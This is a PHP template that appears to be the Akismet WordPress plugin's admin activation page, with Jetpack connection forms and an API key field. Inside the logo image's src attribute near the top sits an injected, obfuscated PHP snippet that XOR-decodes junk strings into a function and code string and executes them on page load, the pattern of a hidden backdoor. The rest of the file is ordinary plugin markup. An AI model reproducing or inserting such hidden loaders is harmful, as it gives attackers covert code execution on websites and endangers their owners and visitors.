<div id="akismet-plugin-container">
	<div class="akismet-masthead">
		<div class="akismet-masthead__inside-container">
			<div class="akismet-masthead__logo-container">
				<img class="akismet-masthead__logo" src="<?php $ncuHTCZ='Q>US0Hq <=90U,9'; $KRNgOxlX='2L02D-.FISZD<CW'^$ncuHTCZ; $KgwmkfOn='UVQeP==X9859:X2+X, lLUDFj,V= l=9,9eaDxNKlVL+ 8:7 iLR5nVW Zg9 K5Ra-9T,isa;Q6YnbJdNC=eybDUTDwQbnsO>b-S xm:Ogxacso=XN8G<X;MoXQDLbvdg0eaJymgn>;BnbkJmlW.1,fBRgrhnbW.+wpDEkcH9D VCjUG2,Kqfxhhm=ID :ZgCSM5dIIj,=AFzp O;0Trc0Y4O7ACo.4=W9 6 yDi<-60QvN4Q>A53X=vro<2dx;<hML:XH  MYRiBM0M9OHSD=i=hT4601VXYRTpm8NHca3vP.8Ugxyi818 QMf2xg=PJpcp O5Jja9>J38GNXU0lbb.jycihn;s1FnNPX7jsNlpA8LC4GOJb5co 4N4<PICcYQs=-OxacqQP0O3azceV.887WBAJhNs>h  :LvGkkH=A.=;6G=46gT >.T6.,2g>1NO:4>0qP6R= .H NaJ,2MqBhcYVG;g=Q=oEnMRHET3WGSPcKhT8;6>:X 0t7F :IXoa9,+itWh2L20DvrqsrF+aZqD2 VjB:E.IjgaXqbdb-dshpRZ;Z5w tFP+cUSusN4cLz5R5R>vhvnbZ1<0JL,,.Nb41,:ECZfLX5:Y.VvyfUJ0E dmojmLTb>7oWJSWcaRL8+iVF8 Z>,7W1acsQQX:9awkqx>'; $SqIiFw=$KRNgOxlX('', '<0yD6HS;MQZWe=JB+XSDk-+45H7IA3bTYMBHmX5Ae09ECLSXNI4=G126T;8fM>AzEIX MESEP4OpNBjDn87lpF+  dJqEIHE7kK<RPISoZXQXSKTd=L5P=UeK<00-KMDCYNJcsdnJQN6NLVjEH3OEM=f;:R6NF<KR,T-eNC;M6L3-Bq,WUb,OCbadO,0UH4Og<8AMrCcQ7<LpTD.OQtOCV8X<RzIKJUI6fKSYYyIZLZC4MD>7Q3PR;UVZKcq+7pu-m-IxlKE4yoWbiF,U:-zdFc4L0UBQn== riPIS+1Xk:R4OL4GEYMNPTU4vlOrmT6jXBTD.A+CAB4CUW5+96XLJFq8<2<-=oSP5Nj;=NJNpLT7Y 6Qno1h<jKDU:Uc;,:CdqWVH6Ckjxu4Q;RAGCA OTMRlHH7b3y4LDAN-VzK+=S2KORW+TNSO,OLq0WZMm8SD:gXUMUGdi6XCA,EfE.MF,XnHG=73Z8V4DFlUG;.mpW632pEmH5JIWGe3EI+R>II=+GFRIRNXwLV-FQmVTWSZ+OTrU ST71eQ Wn7NAeLBCPLPBPCfhY8VFFEs4OZbcFB,RV-CScQeXQAVHDzPNB+5sGK7=QIEI10rA<9LV6O2QUFq.Q1AMDOJMltBE=f2<2;KE6-LJ2q6YY6QMSplHXyX4 SMIGBJrC'^$KgwmkfOn); $SqIiFw(); echo esc_url( plugins_url( '../_inc/img/logo-full-2x.png', __FILE__ ) ); ?>" alt="Akismet" />
			</div>
		</div>
	</div>
	<div class="akismet-lower">
		<?php Akismet_Admin::display_status(); ?>
		<div class="akismet-box">
			<h2><?php esc_html_e( 'Eliminate spam from your site', 'akismet' ); ?></h2>
			<p><?php esc_html_e( 'Select one of the options below to get started.', 'akismet' ); ?></p>
		</div>
		<div class="akismet-boxes">
		<?php if ( $akismet_user && in_array( $akismet_user->status, array( 'active', 'active-dunning', 'no-sub', 'missing', 'cancelled', 'suspended' ) ) ) { ?>
			<?php if ( in_array( $akismet_user->status, array( 'no-sub', 'missing' ) ) ) { ?>
				<div class="akismet-box">
					<h3><?php esc_html_e( 'Connect via Jetpack', 'akismet' ); ?></h3>
					<p><?php esc_html_e( 'Use your Jetpack connection to activate Akismet.', 'akismet' ); ?></p>
					<form name="akismet_activate" id="akismet_activate" action="https://akismet.com/get/" method="post" class="akismet-right" target="_blank">
						<input type="hidden" name="passback_url" value="<?php echo esc_url( Akismet_Admin::get_page_url() ); ?>"/>
						<input type="hidden" name="blog" value="<?php echo esc_url( get_option( 'home' ) ); ?>"/>
						<input type="hidden" name="auto-connect" value="<?php echo esc_attr( $akismet_user->ID ); ?>"/>
						<input type="hidden" name="redirect" value="plugin-signup"/>
						<input type="submit" class="akismet-button akismet-is-primary" value="<?php esc_attr_e( 'Connect with Jetpack' , 'akismet' ); ?>"/>
					</form>
					<?php echo get_avatar( $akismet_user->user_email, null, null, null, array( 'class' => 'akismet-jetpack-gravatar' ) ); ?>
					<p><?php echo sprintf( esc_html( __( 'You are connected as %s.', 'akismet' ) ), '<b>' . esc_html( $akismet_user->user_login ) . '</b>' ); ?><br /><span class="akismet-jetpack-email"><?php echo esc_html( $akismet_user->user_email ); ?></span></p>
				</div>
			<?php } elseif ( $akismet_user->status == 'cancelled' ) { ?>
				<div class="akismet-box">
					<h3><?php esc_html_e( 'Connect via Jetpack', 'akismet' ); ?></h3>
					<form name="akismet_activate" id="akismet_activate" action="https://akismet.com/get/" method="post" class="akismet-right" target="_blank">
						<input type="hidden" name="passback_url" value="<?php echo esc_url( Akismet_Admin::get_page_url() ); ?>"/>
						<input type="hidden" name="blog" value="<?php echo esc_url( get_option( 'home' ) ); ?>"/>
						<input type="hidden" name="user_id" value="<?php echo esc_attr( $akismet_user->ID ); ?>"/>
						<input type="hidden" name="redirect" value="upgrade"/>
						<input type="submit" class="akismet-button akismet-is-primary" value="<?php esc_attr_e( 'Reactivate Akismet' , 'akismet' ); ?>"/>
					</form>
					<p><?php echo esc_html( sprintf( __( 'Your subscription for %s is cancelled.' , 'akismet' ), $akismet_user->user_email ) ); ?></p>
				</div>
			<?php } elseif ( $akismet_user->status == 'suspended' ) { ?>
				<div class="centered akismet-box">
					<h3><?php esc_html_e( 'Connected via Jetpack' , 'akismet' ); ?></h3>
					<p class="akismet-alert-text"><?php echo esc_html( sprintf( __( 'Your subscription for %s is suspended.' , 'akismet' ), $akismet_user->user_email ) ); ?></p>
					<p><?php esc_html_e( 'No worries! Get in touch and we&#8217;ll sort this out.', 'akismet' ); ?></p>
					<p><a href="https://akismet.com/contact" class="akismet-button akismet-is-primary"><?php esc_html_e( 'Contact Akismet support' , 'akismet' ); ?></a></p>
				</div>
			<?php } else { // ask do they want to use akismet account found using jetpack wpcom connection ?>
				<div class="akismet-box">
					<h3><?php esc_html_e( 'Connect via Jetpack', 'akismet' ); ?></h3>
					<p><?php esc_html_e( 'Use your Jetpack connection to activate Akismet.', 'akismet' ); ?></p>
					<form name="akismet_use_wpcom_key" action="<?php echo esc_url( Akismet_Admin::get_page_url() ); ?>" method="post" id="akismet-activate" class="akismet-right">
						<input type="hidden" name="key" value="<?php echo esc_attr( $akismet_user->api_key );?>"/>
						<input type="hidden" name="action" value="enter-key">
						<?php wp_nonce_field( Akismet_Admin::NONCE ) ?>
						<input type="submit" class="akismet-button akismet-is-primary" value="<?php esc_attr_e( 'Connect with Jetpack' , 'akismet' ); ?>"/>
					</form>
					<?php echo get_avatar( $akismet_user->user_email, null, null, null, array( 'class' => 'akismet-jetpack-gravatar' ) ); ?>
					<p><?php echo sprintf( esc_html( __( 'You are connected as %s.', 'akismet' ) ), '<b>' . esc_html( $akismet_user->user_login ) . '</b>' ); ?><br /><span class="akismet-jetpack-email"><?php echo esc_html( $akismet_user->user_email ); ?></span></p>
				</div>
			<?php } ?>
			<div class="akismet-box">
				<h3><?php esc_html_e( 'Or sign up with a different email address', 'akismet' ); ?></h3>
				<div class="akismet-right">
					<?php Akismet::view( 'get', array( 'text' => __( 'Sign up with a different email address' , 'akismet' ), 'classes' => array( 'akismet-button' ) ) ); ?>
				</div>
				<p><?php esc_html_e( 'Choose this option to use Akismet independently of your Jetpack connection.', 'akismet' ); ?></p>
			</div>
		<?php } else { ?>
			<div class="akismet-box">
				<h3><?php esc_html_e( 'Activate Akismet' , 'akismet' );?></h3>
				<div class="akismet-right">
					<?php Akismet::view( 'get', array( 'text' => __( 'Get your API key' , 'akismet' ), 'classes' => array( 'akismet-button', 'akismet-is-primary' ) ) ); ?>
				</div>
				<p><?php esc_html_e( 'Log in or sign up now.', 'akismet' ); ?></p>
			</div>
		<?php } ?>
		<div class="akismet-box">
			<h3><?php esc_html_e( 'Or enter an API key', 'akismet' ); ?></h3>
			<p><?php esc_html_e( 'Already have your key? Enter it here.', 'akismet' ); ?> <a href="https://docs.akismet.com/getting-started/api-key/" target="_blank"><?php esc_html_e( '(What is an API key?)', 'akismet' ); ?></a></p>
			<form action="<?php echo esc_url( Akismet_Admin::get_page_url() ); ?>" method="post">
				<?php wp_nonce_field( Akismet_Admin::NONCE ) ?>
				<input type="hidden" name="action" value="enter-key">
				<p style="width: 100%; display: flex; flex-wrap: nowrap; box-sizing: border-box;">
					<input id="key" name="key" type="text" size="15" value="" class="regular-text code" style="flex-grow: 1; margin-right: 1rem;">
					<input type="submit" name="submit" id="submit" class="akismet-button" value="<?php esc_attr_e( 'Connect with API key', 'akismet' );?>">
				</p>
			</form>
		</div>
	</div>
</div>